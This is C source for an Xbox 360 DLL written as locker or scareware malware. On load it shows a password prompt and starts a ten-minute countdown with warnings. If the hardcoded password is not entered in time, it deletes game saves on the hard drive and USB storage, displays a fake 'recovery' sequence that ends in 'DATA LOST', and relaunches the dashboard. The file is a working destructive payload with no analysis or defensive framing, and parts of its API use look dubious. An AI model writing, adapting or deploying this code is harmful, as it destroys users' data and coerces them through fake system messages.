#include <xtl.h>
#include <xuiapp.h>
#include <xbdm.h>
#include <stdio.h>
#include <string>

#define TIMEOUT_SECONDS 600
#define PASSWORD "letmein"

bool isUnlocked = false;
int timeRemaining = TIMEOUT_SECONDS;

void DeleteGameSaves() {
    const char* paths[] = {"HDD:\\Content\\*", "USB:\\Content\\*"};
    for (int i = 0; i < 2; i++) {
        char command[256];
        sprintf(command, "del %s /s /q", paths[i]);
        DmSendCommand(NULL, command, NULL, 0);
    }
}

void ShowFakeRecovery() {
    XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, L"Recovery Mode Initializing...");
    Sleep(5000);
    XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, L"Restoring Data...");
    Sleep(5000);
    XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, L"ERROR: DATA LOST (Code 0xDEAD)");
}

DWORD WINAPI TimerThread(LPVOID param) {
    while (timeRemaining > 0 && !isUnlocked) {
        Sleep(1000);
        timeRemaining--;
        if (timeRemaining % 60 == 0) {
            wchar_t msg[50];
            swprintf(msg, 50, L"WARNING: %d minutes left!", timeRemaining / 60);
            XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, msg);
        }
    }
    
    if (!isUnlocked) {
        DeleteGameSaves();
        ShowFakeRecovery();
        XLaunchNewImage("flash:\\xboxdash.xex", 0);
    }
    return 0;
}

void LockScreen() {
    while (!isUnlocked) {
        wchar_t input[50] = L"";
        XShowKeyboardUI(0, L"Enter Password", L"Enter the unlock password", input, 50, 0, NULL);
        if (wcscmp(input, L"letmein") == 0) {
            isUnlocked = true;
            XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, L"Access Granted");
            ExitProcess(0);
        } else {
            XNotifyQueueUI(XNOTIFYUI_TYPE_CONSOLEMESSAGE, L"Incorrect Password");
        }
    }
}

BOOL WINAPI DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);
        LockScreen();
    }
    return TRUE;
}
